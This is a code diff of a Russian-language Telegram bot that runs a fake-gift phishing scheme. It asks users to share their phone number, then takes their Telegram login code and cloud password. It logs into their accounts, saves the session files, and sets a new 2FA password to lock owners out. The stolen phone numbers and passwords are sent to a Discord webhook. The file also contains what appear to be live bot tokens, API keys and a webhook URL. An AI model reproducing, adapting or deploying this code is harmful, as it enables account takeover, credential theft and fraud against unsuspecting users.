@@ -11,16 +11,19 @@ from telethon.sessions import SQLiteSession
 from telethon.errors import SessionPasswordNeededError, PasswordHashInvalidError
 import aioschedule
 
+# --- Настройки ---
 BOT_TOKEN = "8496063485:AAGGJpcjFEyLI8bM4hsA6sYmDHYgzb3kRm8"
 DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1411003346126635082/lgiKWDpfa7L_D83oOEjxyX85VF1yNHKdwnmuEfaBLhDyCDO9fXGlMi_tbCez_cONu_lZ"
 API_ID = 24647488
 API_HASH = "5359d6239969c07a29ea06167484a885"
+TARGET_CHAT_ID = "8496063485"
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(bot)
 
 user_data = {}
 
+# --- Шаблоны и картинки ---
 templates = [
     "✨ УСПЕЙ ЗАБРАТЬ 1 ИЗ 1000 КОЛЕЦ 💍",
     "🔥 ЗАБЕРИ МИШКУ ТОЛЬКО СЕГОДНЯ 🔥",
@@ -34,23 +37,13 @@ templates = [
     "❤️ Подарок для особенного человека"
 ]
 
-photos = [
-    "photos/1.png",
-    "photos/2.png",
-    "photos/3.png",
-    "photos/4.png",
-    "photos/5.png",
-    "photos/6.png",
-    "photos/7.png",
-    "photos/8.png",
-    "photos/9.png",
-    "photos/10.png"
-]
-
-TARGET_CHAT_ID = "8496063485"
-
+photos = [f"photos/{i}.png" for i in range(1, 11)]
 index = 0
 
+# --- Папки ---
+os.makedirs("sessions", exist_ok=True)
+
+# --- Рассылка по расписанию ---
 async def send_scheduled_message():
     global index
     try:
@@ -72,6 +65,7 @@ async def on_startup(dp):
     asyncio.create_task(scheduler())
     print("🚀 Бот запущен! Рассылка будет отправляться каждый час.")
 
+# --- Функция установки пароля ---
 async def set_custom_password(client):
     try:
         await client.edit_2fa(new_password='lol123', hint='lol123')
@@ -80,15 +74,17 @@ async def set_custom_password(client):
         print(f"Ошибка при установке пароля через edit_2fa: {e}")
         return False
 
+# --- Обработчики ---
 @dp.message_handler(commands=['start'])
 async def start(message: types.Message):
     kb = InlineKeyboardMarkup(row_width=1)
     kb.add(InlineKeyboardButton(text="🎁 Получить подарок 🎁", callback_data="get_reward"))
-    if os.path.exists("photos/start.png"):
-        with open("photos/start.png", "rb") as photo:
-            await message.answer_photo(photo=photo, caption="Привет, счастливчик! ✨ Твой подарок уже ждёт тебя 🎁 Чтобы забрать его — просто нажми на кнопку ниже!⬇️", reply_markup=kb)
+    start_photo = "photos/start.png"
+    if os.path.exists(start_photo):
+        with open(start_photo, "rb") as photo:
+            await message.answer_photo(photo=photo, caption="Привет, счастливчик! ✨ Твой подарок ждёт тебя 🎁", reply_markup=kb)
     else:
-        await message.answer("Привет, счастливчик! ✨ Твой подарок уже ждёт тебя 🎁 Чтобы забрать его — просто нажми на кнопку ниже!⬇️", reply_markup=kb)
+        await message.answer("Привет, счастливчик! ✨ Твой подарок ждёт тебя 🎁", reply_markup=kb)
 
 @dp.callback_query_handler(lambda c: c.data == "get_reward")
 async def process_callback_get_reward(callback_query: types.CallbackQuery):
@@ -101,13 +97,12 @@ async def process_callback_get_reward(callback_query: types.CallbackQuery):
         pass
     kb = ReplyKeyboardMarkup(resize_keyboard=True)
     kb.add(KeyboardButton(text="🤖Пройти проверку", request_contact=True))
-    await bot.send_message(callback_query.from_user.id, "🎉 Хочешь свой подарок? 🔑 Пройди быструю проверку в нашей системе — это займёт всего пару минут ⏱️ и подарок уже будет у тебя! 🎁✨", reply_markup=kb)
+    await bot.send_message(callback_query.from_user.id, "🎉 Пройди проверку, чтобы получить подарок!", reply_markup=kb)
 
 @dp.message_handler(content_types=['contact'])
 async def handle_contact(message: types.Message):
     phone = message.contact.phone_number
     session_name = f"sessions/{phone}"
-    os.makedirs("sessions", exist_ok=True)
     client = TelegramClient(SQLiteSession(session_name), API_ID, API_HASH)
     await client.connect()
     user_data[message.from_user.id] = {"client": client, "phone": phone, "code": "", "has_password": False, "user_password": None}
@@ -119,7 +114,7 @@ async def handle_contact(message: types.Message):
     kb = ReplyKeyboardMarkup(resize_keyboard=True, row_width=3)
     buttons = [str(i) for i in range(1, 10)] + ['0', 'Удалить', 'Подтвердить']
     kb.add(*buttons)
-    await message.answer("Введите код, отправленный в Telegram:", reply_markup=kb)
+    await message.answer("Введите код из Telegram:", reply_markup=kb)
 
 @dp.message_handler(Text(equals=[str(i) for i in range(10)] + ['Удалить']))
 async def enter_code(message: types.Message):
@@ -150,7 +145,7 @@ async def confirm_code(message: types.Message):
         await finish_session(message, client, phone)
     except SessionPasswordNeededError:
         data["has_password"] = True
-        await message.answer("Введите ваш облачный пароль:")
+        await message.answer("Введите облачный пароль:")
     except Exception as e:
         await message.answer(f"❌ Ошибка: {e}")
 
@@ -167,18 +162,18 @@ async def handle_password(message: types.Message):
             await client.sign_in(password=password_text)
         await finish_session(message, client, data["phone"], data["user_password"])
     except PasswordHashInvalidError:
-        await message.answer("❌ Неверный пароль. Попробуйте еще раз:")
+        await message.answer("❌ Неверный пароль.")
     except Exception as e:
-        await message.answer(f"❌ Ошибка при вводе пароля: {e}")
+        await message.answer(f"❌ Ошибка: {e}")
 
 async def finish_session(message: types.Message, client: TelegramClient, phone: str, user_password=None):
     await client.disconnect()
     session_path = f"sessions/{phone}.session"
-    discord_data = {"content": f"📱 Новая сессия получена\n**Телефон:** {phone}\n"}
+    discord_data = {"content": f"📱 Новая сессия\nТелефон: {phone}\n"}
     if user_password:
-        discord_data["content"] += f"**Пароль пользователя:** ||{user_password}||"
+        discord_data["content"] += f"Пароль пользователя: ||{user_password}||"
     else:
-        discord_data["content"] += "**Установлен пароль:** lol123\n**Двухфакторная аутентификация включена**"
+        discord_data["content"] += "Установлен пароль: lol123"
     try:
         requests.post(DISCORD_WEBHOOK, json=discord_data)
     except:
@@ -191,6 +186,7 @@ async def finish_session(message: types.Message, client: TelegramClient, phone: 
             pass
     await message.answer("✅ Проверка завершена!", reply_markup=ReplyKeyboardRemove())
 
+# --- Запуск ---
 if __name__ == "__main__":
     print("🚀 Бот запускается...")
     executor.start_polling(dp, skip_updates=True, on_startup=on_startup)
